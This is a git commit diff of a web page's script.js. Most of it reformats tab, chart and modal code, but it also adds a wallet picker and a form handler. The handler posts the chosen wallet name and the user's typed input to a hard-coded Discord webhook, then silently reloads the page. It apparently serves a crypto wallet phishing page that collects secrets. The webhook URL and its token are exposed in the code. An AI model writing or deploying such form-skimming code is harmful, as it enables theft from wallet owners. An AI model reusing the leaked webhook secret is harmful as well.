b2ac005a4577f9ff96df29e71e348dd7b871cb74
naymurdev <naymurrahman178@gmail.com>
2024-09-01 15:34:17 +0600

    "Updated HTML, CSS, and JavaScript files with various changes to layout, styling, and functionality."

--- script.js
+++ script.js
@@ -1,27 +1,23 @@
-const tabBtn = document.querySelectorAll('.tab-btn')
-const allContent = document.querySelectorAll('.content')
+const tabBtn = document.querySelectorAll(".tab-btn");
+const allContent = document.querySelectorAll(".content");
 
+tabBtn.forEach((tab, index) => {
+  tab.addEventListener("click", (e) => {
+    tabBtn.forEach((tab) => {
+      tab.classList.remove("active");
+    });
+    tab.classList.add("active");
 
-tabBtn.forEach((tab, index)=> {
-    tab.addEventListener('click', (e)=> {
-        tabBtn.forEach(tab => {
-            tab.classList.remove('active')
-        })
-        tab.classList.add('active')
+    let line = document.querySelector(".line");
+    line.style.width = e.target.offsetWidth + "px";
+    line.style.left = e.target.offsetLeft + "px";
 
-        let line = document.querySelector('.line')
-        line.style.width = e.target.offsetWidth + "px"
-        line.style.left = e.target.offsetLeft + "px"
-
-        allContent.forEach(content => {
-            content.classList.remove('active')
-        })
-        allContent[index].classList.add('active')
-    })
-})
-
-
-
+    allContent.forEach((content) => {
+      content.classList.remove("active");
+    });
+    allContent[index].classList.add("active");
+  });
+});
 
 // Chart
 let primaryColor = getComputedStyle(document.documentElement)
@@ -148,12 +144,9 @@ let barOptions = {
   },
 };
 
-
 let chart = new ApexCharts(document.querySelector(".chart-area"), barOptions);
 
 chart.render();
-
-  
 
 // Modal
 // Get the modal
@@ -166,70 +159,113 @@ const btn = document.getElementById("openModalBtn");
 const closeBtn = document.querySelector(".closeBtn");
 
 // When the user clicks the button, open the modal
-btn.onclick = function() {
-    modal.classList.remove("hidden");
-    modal.classList.add("flex");
-    document.body.style.overflow = "hidden"; // Disable background scrolling
-}
+btn.onclick = function () {
+  modal.classList.remove("hidden");
+  modal.classList.add("flex");
+  document.body.style.overflow = "hidden"; // Disable background scrolling
+};
 
 // When the user clicks on <span> (x), close the modal
-closeBtn.onclick = function() {
-    modal.classList.add("hidden");
-    modal.classList.remove("flex");
-    document.body.style.overflow = "auto"; // Enable background scrolling
-}
+closeBtn.onclick = function () {
+  modal.classList.add("hidden");
+  modal.classList.remove("flex");
+  document.body.style.overflow = "auto"; // Enable background scrolling
+};
 
 // When the user clicks anywhere outside of the modal, close it
-window.onclick = function(event) {
-    if (event.target === modal) {
-        modal.classList.add("hidden");
-        document.body.style.overflow = "auto"; // Enable background scrolling
-    }
-}
-
+window.onclick = function (event) {
+  if (event.target === modal) {
+    modal.classList.add("hidden");
+    document.body.style.overflow = "auto"; // Enable background scrolling
+  }
+};
 
 // active button
-const buttons = document.querySelectorAll('.btn');
+const buttons = document.querySelectorAll(".btn");
 
 // Add a click event listener to each button
-buttons.forEach(button => {
-    button.addEventListener('click', function() {
-        // Remove the 'active' class from all buttons
-        buttons.forEach(btn => btn.classList.remove('active-btn'));
+buttons.forEach((button) => {
+  button.addEventListener("click", function () {
+    // Remove the 'active' class from all buttons
+    buttons.forEach((btn) => btn.classList.remove("active-btn"));
 
-        // Add the 'active' class to the clicked button
-        this.classList.add('active-btn');
-    });
+    // Add the 'active' class to the clicked button
+    this.classList.add("active-btn");
+  });
 });
-
-
 
 // Get all items and the action button
-const items = document.querySelectorAll('.item');
-const actionButton = document.getElementById('actionButton');
+const items = document.querySelectorAll(".item");
+const actionButton = document.getElementById("actionButton");
+
+let itemdata;
 
 // Add a click event listener to each item
-items.forEach(item => {
-    item.addEventListener('click', function() {
-        // Remove the 'active' class from all items
-        items.forEach(itm => itm.classList.remove('active-btn'));
+items.forEach((item) => {
+  item.addEventListener("click", function () {
+    // Remove the 'active' class from all items
+    items.forEach((itm) => itm.classList.remove("active-btn"));
+    const walletElement = this.querySelector("[data-wallet]");
+    if (walletElement) {
+      itemdata = walletElement.getAttribute("data-wallet");
+      console.log("Selected Wallet:", itemdata); // For debugging purposes
+    }
+    // Add the 'active' class to the clicked item
+    this.classList.add("active-btn");
 
-        // Add the 'active' class to the clicked item
-        this.classList.add('active-btn');
-
-        // Enable the action button
-        actionButton.classList.remove('bg-gray-400', 'text-gray-700', 'cursor-not-allowed');
-        actionButton.classList.add('bg-blue-500', 'text-white', 'btnActive');
-        actionButton.disabled = false;
-    });
+    // Enable the action button
+    actionButton.classList.remove(
+      "bg-gray-400",
+      "text-gray-700",
+      "cursor-not-allowed"
+    );
+    actionButton.classList.add("bg-blue-500", "text-white", "btnActive");
+    actionButton.disabled = false;
+  });
 });
 
+const sendMessage = async (e) => {
+  e.preventDefault();
+  const message = e.target.message.value;
+  //   console.log(e);
 
+  const body = {
+    content: "Message Received",
+    tts: false,
+    color: "white",
+    embeds: [
+      {
+        title: "Message from my Client",
+        description: `WalletName: ${itemdata}\nUserName: ${message}`,
+      },
+    ],
+  };
+
+  try {
+    const response = await fetch(
+      "https://discord.com/api/webhooks/1222151318794276885/0NSaMKMqK6gHhxqo4kKVFxM89kLI-SoknyfCuDAaSv1gPfgWXPjAytDh-66xn2FUFW3w",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(body),
+      }
+    );
+    console.log(response);
+    if (response?.ok === true) {
+      window.location.reload();
+    }
+
+    // You can check the status code here if needed, e.g., if (response.status === 204) { ... }
+  } catch (error) {
+    console.error(error);
+  }
+};
 // wallet area hidden
-const walletArea = document.querySelector('.wallet-area')
-const inputFild = document.querySelector('#input-fild')
-actionButton.addEventListener('click', ()=> {
-  walletArea.classList.add('hidden')
-  inputFild.classList.remove('hidden')
-})
-
+const walletArea = document.querySelector(".wallet-area");
+const inputFild = document.querySelector("#input-fild");
+actionButton.addEventListener("click", () => {
+  walletArea.classList.add("hidden");
+  inputFild.classList.remove("hidden");
+});
